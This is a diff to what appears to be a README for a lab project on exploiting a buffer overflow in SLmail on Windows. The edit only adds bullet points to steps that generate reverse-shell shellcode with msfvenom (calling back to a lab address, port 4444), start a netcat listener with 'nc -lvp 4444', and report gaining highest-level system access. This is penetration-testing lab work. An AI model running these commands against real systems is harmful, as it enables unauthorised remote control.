@@ -50,8 +50,8 @@ This project is centered on understanding and executing a Windows buffer overflo
 
 - Crafted a shell code using the “msfvenom -p windows/shell_reverse_tcp LPORT=4444 LHOST=10.0.2.6 -f c -b "\x00\x0a\x0d"” command.
 
-Integrated the shell code into “fuzzy.py” and adjusted the buffer accordingly.
+- Integrated the shell code into “fuzzy.py” and adjusted the buffer accordingly.
 
-Established a netcat listener on the Kali machine using “nc -lvp 4444”.
+- Established a netcat listener on the Kali machine using “nc -lvp 4444”.
 
-Restarted SLmail, ran the “fuzzy.py” script, and achieved system access with highest-level permissions as confirmed by the “whoami” command.
+- Restarted SLmail, ran the “fuzzy.py” script, and achieved system access with highest-level permissions as confirmed by the “whoami” command.
